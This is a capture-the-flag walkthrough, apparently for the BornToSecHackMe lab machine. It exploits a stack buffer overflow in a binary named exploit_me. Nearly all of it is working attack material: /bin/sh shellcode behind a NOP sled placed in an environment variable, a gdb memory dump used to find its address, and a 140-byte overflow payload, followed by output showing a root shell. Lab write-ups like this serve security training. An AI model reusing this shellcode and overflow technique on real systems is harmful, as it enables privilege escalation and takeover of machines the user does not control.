The solution here is to use a shellcode for the exploit_me binary.

1) export shellcode in environment :
```
export SHELLCODE=`python -c 'print "\x90" * 400 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`
```

2) find shellcode's address :
```
(gdb) b main
(gdb) r
(gdb) x/200wx $esp

0xbffff728:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff738:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff748:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff758:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff768:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff778:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff788:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff798:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7a8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7b8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7c8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7d8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7e8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7f8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff808:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff818:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff828:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff838:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff848:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff858:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff868:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff878:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff888:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff898:	0x90909090	0x90909090	0x90909090	0x90909090
```

3) pick an address in the middle :
```
0xbffff7a8
```

4) convert it to little endian :
```
\xa8\xf7\xff\xbf
```

5) run :
```
./exploit_me `python -c "print 'A' * 140 + '\xa8\xf7\xff\xbf'"`
```

```
zaz@BornToSecHackMe:~$ ./exploit_me `python -c "print 'A' * 140 + '\xa8\xf7\xff\xbf'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
# whoami
root
#
```
